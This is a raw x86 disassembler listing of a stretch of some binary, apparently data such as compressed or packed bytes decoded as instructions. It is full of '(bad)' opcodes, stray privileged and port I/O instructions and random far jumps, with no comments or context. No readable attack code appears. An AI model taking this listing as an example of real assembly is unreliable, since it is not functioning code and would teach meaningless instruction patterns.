  4221bf:	outs   dx,BYTE PTR ds:[esi]
  4221c0:	mov    bl,bh
  4221c2:	jg     0x4221f4
  4221c4:	hlt    
  4221c5:	inc    esp
  4221c6:	sub    al,0x34
  4221c8:	bound  ecx,QWORD PTR ds:0x6b241739
  4221ce:	mov    eax,ds:0xc17dee54
  4221d3:	mov    edx,0x5fa5819c
  4221d8:	dec    esp
  4221d9:	inc    ebx
  4221da:	add    bl,BYTE PTR [ecx+0x2]
  4221dd:	mov    esp,0xb9d652b7
  4221e2:	scas   al,BYTE PTR es:[edi]
  4221e3:	push   esi
  4221e4:	shr    BYTE PTR [ecx+0xf351991],cl
  4221ea:	mov    eax,ds:0xe4983819
  4221ef:	xchg   esi,eax
  4221f0:	es mov ebp,0xced1c613
  4221f6:	stos   BYTE PTR es:[edi],al
  4221f7:	and    al,0x21
  4221f9:	imul   ebp,DWORD PTR [eax+0x4dd1e065],0xffffff9c
  422200:	cwde   
  422201:	lds    ebp,FWORD PTR [ebx-0x7f22d663]
  422207:	adc    al,0xaa
  422209:	test   al,0x2c
  42220b:	xchg   esp,eax
  42220c:	inc    edx
  42220d:	aam    0x1c
  42220f:	aaa    
  422210:	push   ebx
  422211:	into   
  422212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422213:	lock sbb esi,esi
  422216:	dec    esi
  422217:	inc    esi
  422218:	aad    0xf8
  42221a:	popf   
  42221b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42221c:	xor    DWORD PTR [ecx],eax
  42221e:	adc    BYTE PTR ss:[esp+eax*1+0x1162de24],ch
  422226:	xchg   ecx,eax
  422227:	rcr    BYTE PTR [ebp-0x3f],0x25
  42222b:	jp     0x422269
  42222d:	sub    al,0xf2
  42222f:	rcl    DWORD PTR [edx+eax*1+0x18],0x26
  422234:	jl     0x42220a
  422236:	mov    dh,0xce
  422238:	hlt    
  422239:	mov    DWORD PTR [esi-0x30],edi
  42223c:	ret    0xc23e
  42223f:	shr    BYTE PTR [ebx+0x57e57fdb],cl
  422245:	inc    edx
  422246:	sti    
  422247:	sahf   
  422248:	adc    ecx,ecx
  42224a:	(bad)  
  42224b:	jmp    0x4222af
  42224d:	xlat   BYTE PTR ds:[ebx]
  42224e:	ret    
  42224f:	cli    
  422250:	scas   eax,DWORD PTR es:[edi]
  422251:	mov    edx,0xc9fbe2ef
  422256:	and    DWORD PTR [edi-0x12],edx
  422259:	jbe    0x4221e5
  42225b:	add    eax,0xf0e55e0c
  422260:	mov    esp,0x9fc823fc
  422265:	sbb    eax,0x8bf3620f
  42226a:	fcomp  QWORD PTR [edi-0xb]
  42226d:	outs   dx,DWORD PTR ds:[esi]
  42226e:	aad    0x5f
  422270:	dec    edi
  422271:	inc    ebp
  422272:	jg     0x4222ab
  422274:	xor    ch,BYTE PTR [edx]
  422276:	mov    al,ds:0x7b047d9a
  42227b:	push   esi
  42227c:	sub    DWORD PTR [edi],0xe4e725ea
  422282:	cli    
  422283:	dec    eax
  422284:	xchg   ecx,eax
  422285:	fsub   DWORD PTR ds:0xbc486efa
  42228b:	neg    BYTE PTR [bx+di-0x32]
  42228f:	add    eax,0xbf3cbf4e
  422294:	cmovl  eax,DWORD PTR [ecx-0x52]
  422298:	inc    edi
  422299:	xlat   BYTE PTR ds:[ebx]
  42229a:	and    DWORD PTR [esi],0x48621f63
  4222a0:	xchg   edx,esi
  4222a2:	pop    ebp
  4222a3:	les    eax,FWORD PTR [eax]
  4222a5:	add    BYTE PTR [eax],al
  4222a7:	add    BYTE PTR [eax],al
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0x1cea77dc,eax
  4222b9:	mul    BYTE PTR [eax-0x4f]
  4222bc:	add    DWORD PTR [eax],eax
  4222be:	add    BYTE PTR [esi],0x0
  4222c1:	add    BYTE PTR [ebp-0x25f77c69],dh
  4222c7:	push   eax
  4222c8:	ins    DWORD PTR es:[edi],dx
  4222c9:	sbb    dh,bh
  4222cb:	ja     0x42229f
  4222cd:	jle    0x422293
  4222cf:	xchg   ebp,eax
  4222d0:	out    0x11,eax
  4222d2:	fist   DWORD PTR [esi-0x7e]
  4222d5:	rol    DWORD PTR [edx],1
  4222d7:	adc    eax,0x5b056526
  4222dc:	cmp    al,0x22
  4222de:	jp     0x4222bd
  4222e0:	call   0xa9fc:0x5c834c97
  4222e7:	test   esp,0xc0a871d9
  4222ed:	jo     0x422355
  4222ef:	cmp    eax,0x74b4efe1
  4222f4:	cmp    eax,0xa97699c0
  4222f9:	mov    dl,0x35
  4222fb:	mov    ebp,0x35359cb9
  422300:	adc    al,0x36
  422302:	dec    DWORD PTR [ebx+ebx*4]
  422305:	adc    eax,0xe50f78fa
  42230a:	cwd    
  42230c:	sub    BYTE PTR [edx],al
  42230e:	cmp    dh,BYTE PTR [ebp+0xd]
  422311:	mov    al,ds:0x24f6018e
  422316:	inc    eax
  422317:	ret    
  422318:	sub    edx,ebx
  42231a:	ss cli 
  42231c:	aam    0xe4
  42231e:	gs fs jle 0x4222f5
  422322:	data16 adc BYTE PTR [esi+0x46],bh
  422326:	adc    BYTE PTR [esi-0x7a],ah
  422329:	nop
  42232a:	cmp    DWORD PTR [eax],esi
  42232c:	(bad)  
  42232d:	jecxz  0x422315
  42232f:	ret    
  422330:	dec    eax
  422331:	jo     0x4222c2
  422333:	cld    
  422334:	mov    al,ds:0x2dda672b
  422339:	lea    edx,[eax+0x6e3da55e]
  42233f:	stos   DWORD PTR es:[edi],eax
  422340:	ins    BYTE PTR es:[edi],dx
  422341:	pop    esp
  422342:	inc    eax
  422343:	popf   
  422344:	jns    0x42230b
  422346:	repz adc BYTE PTR ds:0x586d190f,ah
  42234d:	lods   al,BYTE PTR ds:[esi]
  42234e:	push   es
  42234f:	push   es
  422350:	xor    al,0xd2
  422352:	xchg   esi,eax
  422353:	add    DWORD PTR [edi],0xffffffa0
  422356:	dec    esi
  422357:	cmp    BYTE PTR [ebp-0xf],bh
  42235a:	fisub  DWORD PTR [ecx]
  42235c:	mov    ecx,0xbdb9a235
  422361:	sub    eax,0xa439bbe6
  422367:	cmp    eax,0xf9eea0a9
  42236c:	retf   0x6b07
  42236f:	or     BYTE PTR [eax],dl
  422371:	xor    DWORD PTR ds:0xe5f9dcbd,edx
  422377:	sbb    al,0x5c
  422379:	fmul   DWORD PTR [edi+edx*8+0x68]
  42237d:	stos   DWORD PTR es:[edi],eax
  42237e:	ffreep st(1)
  422380:	mov    edi,0xf54d41f5
  422385:	add    eax,0x6576f084
  42238a:	xlat   BYTE PTR ds:[ebx]
  42238b:	jmp    DWORD PTR [edx+0x16]
  42238e:	xchg   esi,eax
  42238f:	push   cs
  422390:	mov    ds:0xa46e0409,eax
  422395:	jnp    0x422338
  422397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422398:	retf   0x9173
  42239b:	jp     0x4223bc
  42239d:	mov    eax,ds:0x3eeea5d7
  4223a2:	adc    esi,edx
  4223a4:	and    BYTE PTR [eax],al
  4223a6:	mov    al,0xcd
  4223a8:	sub    ax,0x6afb
  4223ac:	push   ebx
  4223ad:	fst    QWORD PTR ss:[esi]
  4223b0:	mov    eax,ds:0x5fa34495
  4223b5:	adc    DWORD PTR [eax-0x5303aa4f],esi
  4223bb:	dec    ebp
  4223bc:	mov    ds:0x5ad9ae5,al
  4223c1:	adc    cl,BYTE PTR es:[ecx-0x2aca1728]
  4223c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c9:	lock stos BYTE PTR es:[edi],al
  4223cb:	or     DWORD PTR [ecx+0x415ab59e],edx
  4223d1:	fwait
  4223d2:	ds out 0x6d,al
  4223d5:	addr16 jbe 0x4223b5
  4223d8:	arpl   WORD PTR [ebx],bx
  4223da:	fstp   DWORD PTR [ebp+eiz*4-0x4d]
  4223de:	push   edx
  4223df:	ins    BYTE PTR es:[edi],dx
  4223e0:	inc    edx
  4223e1:	push   ebx
  4223e2:	(bad)  
  4223e4:	pushf  
  4223e5:	sub    eax,0x263ba130
  4223ea:	fs jbe 0x422408
  4223ed:	xlat   BYTE PTR ds:[ebx]
  4223ee:	es sub dh,ch
  4223f1:	nop
  4223f2:	neg    BYTE PTR [ecx-0x67]
  4223f5:	dec    eax
  4223f6:	ds (bad) 
  4223f8:	cmp    eax,DWORD PTR [ebx]
  4223fa:	loopne 0x4223d4
  4223fc:	mov    ?,WORD PTR [edx-0x5d]
  4223ff:	sbb    al,0xc2
  422401:	push   ebp
  422402:	sbb    ebp,esi
  422404:	mov    esp,0xfb1020ed
  422409:	std    
  42240a:	fsub   QWORD PTR [ebp+0x1a18ca18]
  422410:	arpl   WORD PTR [ebp-0x63],si
  422413:	xor    eax,0xcb0cf8d
  422418:	mov    ecx,0x77acea
  42241d:	shld   eax,esp,cl
  422420:	mov    bh,0x96
  422422:	fdiv   QWORD PTR [esi]
  422424:	dec    ebp
  422425:	sub    cl,ah
  422427:	jmp    0xd630:0x68a5b84f
  42242e:	jl     0x4223c6
  422430:	pop    eax
  422431:	shl    BYTE PTR [esi+0x76cda721],0xb9
  422438:	imul   edi,esp,0xffffffdd
  42243b:	dec    esp
  42243c:	call   0xb34496c4
  422441:	xchg   BYTE PTR [esi-0x38aeca91],cl
  422447:	push   ebp
  422448:	loop   0x4223d7
  42244a:	and    al,0xf9
  42244c:	popf   
  42244d:	test   DWORD PTR [ecx+0x3b038dd1],ebx
  422453:	xchg   esi,eax
  422454:	dec    edi
  422455:	jbe    0x42240c
  422457:	out    dx,eax
  422458:	mov    dh,0x75
  42245a:	jno    0x422427
  42245c:	mov    esi,0x7b7b07d7
  422461:	std    
  422462:	inc    edx
  422463:	cld    
  422464:	fsub   DWORD PTR [eax]
  422466:	std    
  422467:	mov    ss,WORD PTR [esi+0x47]
  42246a:	jns    0x4224e3
  42246c:	xor    eax,0x8f655764
  422471:	lods   al,BYTE PTR ds:[esi]
  422472:	sbb    eax,0xf9cc2eb5
  422477:	(bad)  
  422478:	push   eax
  422479:	data16 std 
  42247b:	sti    
  42247c:	dec    ecx
  42247d:	test   DWORD PTR [ecx+0x313711a4],0xa8f5ae65
  422487:	test   ah,ch
  422489:	ret    
  42248a:	pop    edx
  42248b:	jns    0x422477
  42248d:	xchg   BYTE PTR [edi-0x3b],cl
  422490:	mov    WORD PTR [ecx+esi*8],ss
  422493:	mov    ebp,fs
  422495:	mov    ch,BYTE PTR [ecx-0x5898eee3]
  42249b:	xchg   edi,eax
  42249c:	mov    WORD PTR [eax+ebp*4-0x10],cs
  4224a0:	mov    edx,0xaf52d213
  4224a5:	out    0xed,eax
  4224a7:	cmc    
  4224a8:	retf   
  4224a9:	fisub  DWORD PTR [esi-0x37a1b854]
  4224af:	shl    dh,1
  4224b1:	mov    ds:0x289c74f7,al
  4224b6:	call   0xf3d9c87d
  4224bb:	and    al,0x95
  4224bd:	pop    ss
  4224be:	jmp    0x422452
  4224c0:	jmp    0x59fb2a66
  4224c5:	fisub  DWORD PTR [ebp+edx*4+0x31fe6956]
  4224cc:	or     ch,BYTE PTR [esi+0x1b]
  4224cf:	std    
  4224d0:	inc    esp
  4224d1:	xor    dh,0x7e
  4224d4:	push   ebp
  4224d5:	cdq    
  4224d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224d7:	call   0x4d50bc58
  4224dc:	xchg   edi,eax
  4224dd:	adc    ah,dh
  4224df:	stc    
  4224e0:	mov    ebp,0x60c81209
  4224e5:	repz sub eax,0xba79781e
  4224eb:	leave  
  4224ec:	sbb    eax,0xfa4bcf00
  4224f1:	mov    eax,0xce594c12
  4224f6:	sbb    eax,0x90df9712
  4224fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fc:	lds    esi,FWORD PTR [ebx]
  4224fe:	add    al,0x17
  422500:	mov    ebp,0xba419151
  422505:	fisubr DWORD PTR [edx+0x2e]
  422508:	ds aaa 
  42250a:	outs   dx,DWORD PTR ds:[esi]
  42250b:	int    0xc3
  42250d:	addr16 sbb al,0x62
  422510:	adc    eax,0xd64c0ca4
  422515:	inc    ecx
  422516:	fidiv  DWORD PTR [ecx-0x41935a3e]
  42251c:	pop    es
  42251d:	inc    edi
  42251e:	ret    
  42251f:	mov    esp,0xcfbf141d
  422524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422525:	fwait
  422526:	rol    dh,1
  422528:	call   DWORD PTR [ecx-0x6ba5344b]
  42252e:	push   0x31
  422530:	dec    ebx
  422531:	jb     0x42254c
  422533:	lea    cx,[edi-0x9]
  422537:	dec    edi
  422538:	jmp    0x8398:0x4b553d4d
  42253f:	pusha  
  422540:	and    BYTE PTR [ecx],cl
  422542:	repnz cmp al,0xe3
  422545:	sbb    eax,0x47039f05
  42254a:	in     eax,0xb0
  42254c:	in     al,0xbc
  42254e:	jmp    0x30113dc3
  422553:	pop    edi
  422554:	xor    al,0x79
  422556:	and    eax,0x2fa7fd83
  42255b:	in     al,dx
  42255c:	mov    edx,0xf62e1de8
  422561:	jge    0x422574
  422563:	(bad)  
  422564:	test   DWORD PTR [esi-0x55],0x5600b44d
  42256b:	pop    ds
  42256c:	fcomp  QWORD PTR [esi+0x4a]
  42256f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422570:	jge    0x422597
  422572:	stos   BYTE PTR es:[edi],al
  422573:	(bad)  
  422574:	mov    BYTE PTR [ebp+0x7600211f],cl
  42257a:	mov    ebp,ebx
  42257c:	call   0x4f724892
  422581:	push   ecx
  422582:	jmp    0x15f2f7f
  422587:	iret   
  422588:	fs (bad) 
  42258a:	cmc    
  42258b:	jmp    0x422575
  42258d:	mov    dh,0x6
  42258f:	rcl    DWORD PTR [eax-0x4c3d4819],cl
  422595:	adc    dh,ah
  422597:	add    ebp,edi
  422599:	mov    ebx,0x63f29f05
  42259e:	out    dx,al
  42259f:	lock test eax,0x9382c816
  4225a5:	dec    ebx
  4225a6:	ror    DWORD PTR [esi],cl
  4225a8:	lods   al,BYTE PTR ds:[esi]
  4225a9:	cdq    
  4225aa:	adc    DWORD PTR [ecx+0x66],ebx
  4225ad:	mov    WORD PTR [ebx+0x42],fs
  4225b0:	push   0xe5d89de
  4225b5:	sub    eax,0xe4f94fc3
  4225ba:	cs stc 
  4225bc:	mov    ebx,0xb0f23fdc
  4225c1:	inc    edx
  4225c2:	into   
  4225c3:	div    edx
  4225c5:	cmp    ah,BYTE PTR [esp+esi*8]
  4225c8:	inc    edi
  4225c9:	jge    0x422572
  4225cb:	ja     0x4225e5
  4225cd:	or     al,0x5d
  4225cf:	pop    ds
  4225d0:	or     al,0x84
  4225d2:	aam    0xb9
  4225d4:	inc    esp
  4225d5:	inc    edi
  4225d6:	test   BYTE PTR [eax+0x79fd5d75],dh
  4225dc:	(bad)  
  4225dd:	dec    DWORD PTR [eiz*8+0xa67f0e4]
  4225e4:	fcomi  st,st(6)
  4225e6:	scas   al,BYTE PTR es:[edi]
  4225e7:	imul   esp,DWORD PTR [esi*4-0x6d8f751],0xffffffb9
  4225ef:	dec    ebx
  4225f0:	dec    ebx
  4225f1:	push   ebx
  4225f2:	xchg   esp,eax
  4225f3:	dec    edi
  4225f4:	loop   0x4225c2
  4225f6:	push   ds
  4225f7:	xchg   esi,eax
  4225f8:	xlat   BYTE PTR ds:[ebx]
  4225f9:	xchg   ebx,eax
  4225fa:	xlat   BYTE PTR ds:[ebx]
  4225fb:	leave  
  4225fc:	push   eax
  4225fd:	jge    0x422648
  4225ff:	int3   
  422600:	dec    esp
  422601:	lods   eax,DWORD PTR ds:[esi]
  422602:	repz sub ch,BYTE PTR [eax]
  422605:	xor    al,0x57
  422607:	(bad)  
  422608:	jo     0x422651
  42260a:	mov    ebp,0x78072a55
  42260f:	xchg   ecx,eax
  422610:	inc    esp
  422611:	in     al,0x91
  422613:	into   
  422614:	add    BYTE PTR [edi+ecx*1-0x6d125042],dh
  42261b:	movups xmm5,xmm3
  42261e:	pop    eax
  42261f:	lds    ebx,FWORD PTR [ebx]
  422621:	mul    BYTE PTR [esi+eax*1-0x28]
  422625:	mov    ebx,cr2
  422628:	add    eax,0xdd99ed98
  42262d:	pushf  
  42262e:	cmc    
  42262f:	test   DWORD PTR [ecx],eax
  422631:	cdq    
  422632:	xchg   ecx,eax
  422633:	xchg   DWORD PTR [ebx],edi
  422635:	out    dx,al
  422636:	hlt    
  422637:	int3   
  422638:	mov    edi,0x41163d9b
  42263d:	or     edi,ebx
  42263f:	push   ebp
  422640:	fs and DWORD PTR fs:[esi],edx
  422644:	addr16 adc al,0x7e
  422647:	xchg   ebx,eax
  422648:	pop    edx
  422649:	ds pop es
  42264b:	mov    fs,WORD PTR [esp+ecx*8+0x788f452e]
  422652:	pop    ds
  422653:	sbb    DWORD PTR [ebp-0x439e92bf],edi
  422659:	adc    edx,0x7160b803
  42265f:	and    dl,ah
  422661:	or     DWORD PTR [edx],eax
  422663:	cmp    BYTE PTR [ecx],dl
  422665:	inc    eax
  422666:	or     DWORD PTR [ebx],0xc0e77fff
  42266c:	and    al,0xac
  42266e:	(bad)  
  42266f:	fmul   QWORD PTR [ebx-0x7f996bfa]
  422675:	xchg   esi,eax
  422676:	(bad)  
  422677:	gs mov edi,0xa48d9bcb
  42267d:	pop    esp
  42267e:	(bad)  
  42267f:	ins    BYTE PTR es:[edi],dx
  422680:	dec    edi
  422681:	ror    dh,cl
  422683:	mov    esp,0x5f62d493
  422688:	neg    ebx
  42268a:	in     al,dx
  42268b:	mov    DWORD PTR [ebp-0x4d08382a],esp
  422691:	stos   BYTE PTR es:[edi],al
  422692:	pop    ecx
  422693:	xchg   bx,ax
  422695:	aaa    
  422696:	leave  
  422697:	out    0xf3,eax
  422699:	dec    edx
  42269a:	push   0xd652f9fc
  42269f:	pop    ebp
  4226a0:	inc    ebp
  4226a1:	stos   DWORD PTR es:[edi],eax
  4226a2:	push   cs
  4226a3:	icebp  
  4226a4:	mov    ebp,0xb36efe6b
  4226a9:	cli    
  4226aa:	xlat   BYTE PTR ds:[ebx]
  4226ab:	std    
  4226ac:	jnp    0x422705
  4226ae:	outs   dx,BYTE PTR ds:[esi]
  4226af:	push   es
  4226b0:	cmp    cl,BYTE PTR [eax-0x54]
  4226b3:	jmp    0x4872:0xb904bd76
  4226ba:	das    
  4226bb:	hlt    
  4226bc:	pop    edx
  4226bd:	pop    ss
  4226be:	cmp    dh,BYTE PTR [ecx+0x78881c07]
  4226c4:	out    0x4d,al
  4226c6:	jno    0x422676
  4226c8:	ffree  st(3)
  4226ca:	jg     0x422718
  4226cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226cd:	fld    TBYTE PTR [ebx+0x6e]
  4226d0:	xchg   ecx,eax
  4226d1:	xchg   esp,eax
  4226d2:	xlat   BYTE PTR ds:[ebx]
  4226d3:	shl    DWORD PTR [ecx+0x1fce4158],1
  4226d9:	das    
  4226da:	int    0x7
  4226dc:	ins    BYTE PTR es:[edi],dx
  4226dd:	cli    
  4226de:	fild   DWORD PTR [ebx]
  4226e0:	jb     0x4226fa
  4226e2:	pop    edx
  4226e3:	push   ss
  4226e4:	mov    ds:0xbb2c04d0,eax
  4226e9:	adc    ebp,esi
  4226eb:	aaa    
  4226ec:	lds    ebx,FWORD PTR [esi]
  4226ee:	rcr    BYTE PTR [esp+ebp*8],1
  4226f1:	fdiv   DWORD PTR [eax]
  4226f3:	(bad)  
  4226f4:	mov    al,0xaf
  4226f6:	push   ebp
  4226f7:	fbstp  TBYTE PTR [esi+0x6]
  4226fa:	push   ebx
  4226fb:	nop
  4226fc:	bswap  esp
  4226fe:	push   eax
  4226ff:	pop    ecx
  422700:	sub    BYTE PTR [eax-0x11],0x6
  422704:	mov    cl,cl
  422706:	ss pop ecx
  422708:	mov    dh,0x9
  42270a:	mov    eax,ds:0xdc1be911
  42270f:	test   eax,0xbccc8fdc
  422714:	test   DWORD PTR fs:[eax+0x50d98ed1],ebx
  42271b:	(bad)  
  42271c:	sub    al,0xb3
  42271e:	in     al,dx
  42271f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422720:	sbb    al,0xb0
  422722:	push   ebp
  422723:	pop    eax
  422724:	or     ebp,eax
  422726:	adc    BYTE PTR [edi+0x33],bh
  422729:	xchg   BYTE PTR [edx],bh
  42272b:	jecxz  0x4227aa
  42272d:	dec    eax
  42272e:	inc    esi
  42272f:	xchg   esi,eax
  422730:	lds    esp,FWORD PTR ds:0x6d2c7227
  422736:	sub    BYTE PTR [ebx],dl
  422738:	cdq    
  422739:	sub    eax,0x1066bc2
  42273e:	pop    es
  42273f:	fdiv   QWORD PTR [edi]
  422741:	and    eax,0xe585f541
  422746:	xchg   ecx,eax
  422747:	aaa    
  422748:	fimul  WORD PTR [ecx+ebx*8]
  42274b:	adc    edi,DWORD PTR [edi+0x203e46bf]
  422751:	add    eax,0x7d11698f
  422756:	jno    0x422744
  422758:	hlt    
  422759:	fisttp DWORD PTR [ecx+0x5d95faad]
  42275f:	data16 mov bh,0xa1
  422762:	xchg   edi,eax
  422763:	sbb    ah,BYTE PTR [ebx-0x6d1c934f]
  422769:	dec    edi
  42276a:	and    eax,0x3c18e6d7
  42276f:	mov    al,ds:0xcbbd4491
  422774:	ss pop ss
  422776:	test   al,0xad
  422778:	sub    al,0xa3
  42277a:	jo     0x42271d
  42277c:	ins    BYTE PTR es:[edi],dx
  42277d:	std    
  42277e:	pop    es
  42277f:	cmp    edi,eax
  422781:	cli    
  422782:	pop    ebx
  422783:	inc    ecx
  422784:	out    dx,al
  422785:	push   ebp
  422786:	ret    
  422787:	push   ds
  422788:	dec    esi
  422789:	and    eax,0xb212b725
  42278e:	push   edi
  42278f:	fcmovbe st,st(5)
  422791:	stc    
  422792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422793:	and    BYTE PTR [esi+0x12c5842c],al
  422799:	hlt    
  42279a:	mov    ah,0xe3
  42279c:	pop    edi
  42279d:	push   esi
  42279e:	and    DWORD PTR [edx+0x6b],edx
  4227a1:	mov    cl,0x9e
  4227a3:	mov    eax,cs
  4227a5:	push   edx
  4227a6:	pop    ebp
  4227a7:	xor    al,0xf6
  4227a9:	jnp    0x42273b
  4227ab:	cmp    al,0xf3
  4227ad:	sub    eax,0x30369d7
  4227b2:	nop
  4227b3:	scas   eax,DWORD PTR es:[edi]
  4227b4:	loop   0x42277d
  4227b6:	(bad)  
  4227b7:	push   DWORD PTR [ebx-0x8]
  4227ba:	cmp    al,0xfe
  4227bc:	push   0x1b959d43
  4227c1:	leave  
  4227c2:	(bad)  
  4227c3:	push   ebx
  4227c4:	add    bh,BYTE PTR ds:0xebabccd
  4227ca:	jmp    0x4fc5441e
  4227cf:	loopne 0x42283e
  4227d1:	mov    WORD PTR [eax-0x20283830],cs
  4227d7:	es cmp eax,0xc4ada4a0
  4227dd:	jb     0x422832
  4227df:	push   esp
  4227e0:	dec    ebx
  4227e1:	das    
  4227e2:	in     al,0x75
  4227e4:	jbe    0x422796
  4227e6:	(bad)  
  4227e7:	and    esi,ebx
  4227e9:	(bad)  
  4227ea:	stc    
  4227eb:	xchg   esi,eax
  4227ec:	into   
  4227ed:	ret    
  4227ee:	enter  0x4fca,0xe9
  4227f2:	xchg   BYTE PTR [ebp-0x382a8a41],bh
  4227f8:	and    al,0xb2
  4227fa:	dec    ecx
  4227fb:	out    0x75,al
  4227fd:	test   eax,0x4932e432
  422802:	ds pop edi
  422804:	adc    ebp,eax
  422806:	inc    esi
  422807:	lods   al,BYTE PTR ds:[esi]
  422808:	sbb    eax,0x76e97746
  42280d:	pushf  
  42280e:	jmp    0xad77:0x913b59d1
  422815:	dec    esp
  422816:	dec    edx
  422817:	fnsave ds:0xf913dfc2
  42281d:	retf   0xff58
  422820:	scas   al,BYTE PTR es:[edi]
  422821:	icebp  
  422822:	adc    DWORD PTR [ecx+0x266ada17],edi
  422828:	lock add eax,DWORD PTR [ebx-0x3d4d77ff]
  42282f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422830:	adc    BYTE PTR [ebx],0x1a
  422833:	xor    eax,0x24ef84bf
  422838:	mov    dl,0xac
  42283a:	push   0x127e7757
  42283f:	pop    es
  422840:	clc    
  422841:	adc    dl,cl
  422843:	xchg   edx,eax
  422844:	pop    edx
  422845:	enter  0x6b83,0xab
  422849:	lea    esi,[ebx+0x21]
  42284c:	sub    eax,DWORD PTR [edi+edi*1-0x717c5364]
  422853:	xchg   BYTE PTR [edi+ebp*2+0x31],bl
  422857:	xor    edi,edx
  422859:	xchg   ebp,eax
  42285a:	inc    esp
  42285b:	es je  0x4227e0
  42285e:	neg    DWORD PTR [ebx]
  422860:	ss stc 
  422862:	call   DWORD PTR [eax-0x266885c5]
  422868:	bswap  esp
  42286a:	jle    0x42288f
  42286c:	test   BYTE PTR [eax+edi*2-0x12],0x74
  422871:	(bad)  
  422873:	xchg   edi,eax
  422874:	jno    0x422848
  422876:	or     DWORD PTR [eax-0x6baa75b6],ecx
  42287c:	rsqrtps xmm5,xmm7
  42287f:	mov    ds:0x49e1c8c6,eax
  422884:	(bad)
  422887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422888:	cmp    ebp,DWORD PTR [eax+0x3b2ee43]
  42288e:	mov    eax,ds:0x69741d78
  422893:	push   cs
  422894:	in     eax,dx
  422895:	jle    0x4228f9
  422897:	aas    
  422898:	cwde   
  422899:	rol    BYTE PTR [esi+0x78],cl
  42289c:	cmp    edi,ebp
  42289e:	fcom   st(6)
  4228a0:	mov    bl,0xdd
  4228a2:	add    al,0xa
  4228a5:	outs   dx,BYTE PTR ds:[esi]
  4228a6:	ret    
  4228a7:	mov    edi,0xde8017d9
  4228ac:	aas    
  4228ad:	sbb    al,ch
  4228af:	dec    edi
  4228b0:	icebp  
  4228b1:	dec    ebp
  4228b2:	pop    eax
  4228b3:	add    al,0xfe
  4228b5:	dec    edi
  4228b6:	add    bl,BYTE PTR [bx+si+0x5e]
  4228ba:	sahf   
  4228bb:	or     al,0x54
  4228bd:	and    BYTE PTR [edx+0x192082b9],cl
  4228c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228c4:	xchg   edx,eax
  4228c5:	push   eax
  4228c6:	and    eax,0x911e5d0b
  4228cb:	cmp    BYTE PTR [eax],dl
  4228cd:	shl    DWORD PTR [edx],1
  4228cf:	retf   
  4228d0:	xchg   esi,eax
  4228d1:	dec    edx
  4228d2:	push   eax
  4228d3:	xchg   esi,eax
  4228d4:	rcl    BYTE PTR [eax-0x17c738f4],1
  4228da:	mov    bh,0xaf
  4228dc:	in     eax,0x83
  4228de:	cmp    BYTE PTR [esi],0x3c
  4228e1:	xor    BYTE PTR [edi-0x55d65bb7],dl
  4228e7:	inc    edi
  4228e8:	rcl    DWORD PTR [edx-0x2905b01a],0xf4
  4228ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228f0:	add    al,0x3a
  4228f2:	cld    
  4228f3:	jne    0x422917
  4228f5:	fidivr WORD PTR [edi]
  4228f7:	xchg   ebx,eax
  4228f8:	test   al,dh
  4228fa:	and    dl,0xa
  4228fd:	jp     0x4228bf
  4228ff:	test   BYTE PTR [edi],dh
  422901:	inc    edi
  422902:	cmp    BYTE PTR [ecx-0x60be7754],ah
  422908:	and    eax,DWORD PTR [esp+eiz*2+0x3e0644c8]
  42290f:	daa    
  422910:	mov    al,ds:0xa78eda41
  422915:	fnstenv [edi-0x30]
  422918:	aam    0x13
  42291a:	ret    
  42291b:	jge    0x422977
  42291d:	sub    al,0x1a
  42291f:	dec    ebp
  422920:	inc    edi
  422921:	adc    DWORD PTR ds:0xdea4da88,esp
  422927:	sub    esi,esp
  422929:	sub    ebp,DWORD PTR [ebp+0x67]
  42292c:	mov    ebx,0x1bae4b5
  422931:	cdq    
  422932:	iret   
  422933:	jno    0x422999
  422935:	outs   dx,DWORD PTR ds:[esi]
  422936:	(bad)  
  422937:	out    dx,al
  422938:	test   eax,0x5b8a08ad
  42293d:	xlat   BYTE PTR ds:[ebx]
  42293e:	(bad)  
  42293f:	fimul  DWORD PTR [ecx+0x25]
  422942:	pushf  
  422943:	rol    DWORD PTR [eax],0x0
  422946:	add    BYTE PTR [eax],al
  422948:	add    BYTE PTR [eax],al
  42294a:	dec    eax
  42294b:	push   eax
  42294c:	push   eax
  42294d:	dec    ebp
  42294e:	pop    eax
  42294f:	dec    ebp
  422950:	pop    ebp
  422951:	push   ebp
  422952:	stos   DWORD PTR es:[edi],eax
  422953:	mov    ch,0xf6
  422955:	stc    
  422956:	sub    DWORD PTR [esi-0x481d4fff],edi
  42295c:	add    DWORD PTR [eax],eax
  42295e:	add    BYTE PTR [esi],0x0
  422961:	add    BYTE PTR [ebx-0x7a],ch
  422964:	mov    bh,0x2e
  422966:	(bad)  
  422968:	dec    ebx
  422969:	jmp    0x8262:0xa6cef316
  422970:	pop    es
  422971:	mov    ebx,0x1edf5c97
  422976:	mov    esp,0xae1ed521
  42297b:	add    al,0x4e
  42297d:	jo     0x4228ff
  42297f:	lods   al,BYTE PTR ds:[esi]
  422980:	lds    ebx,FWORD PTR [edi-0x4]
  422983:	sti    
  422984:	sbb    dl,BYTE PTR [esi+0x7e6ff2bb]
  42298a:	add    BYTE PTR cs:[edx-0x475517f6],dl
  422991:	sbb    bh,cl
  422993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422994:	rcl    BYTE PTR ds:0x48d7ced4,0x75
